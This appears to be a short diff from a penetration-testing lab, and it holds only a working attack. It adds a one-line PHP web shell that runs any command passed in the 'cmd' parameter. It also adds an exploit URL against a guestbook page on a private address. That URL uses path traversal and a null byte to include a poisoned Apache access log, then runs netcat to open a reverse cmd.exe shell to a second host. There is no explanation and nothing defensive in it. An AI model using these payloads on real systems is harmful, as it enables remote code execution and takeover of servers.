@@ -1,0 +1,3 @@
+<?php echo shell_exec($_GET['cmd']);?>
+
+http://10.11.25.68/addguestbook.php?name=test&comment=test&cmd=nc%20-nv%2010.11.0.210%20443%20-e%20cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit
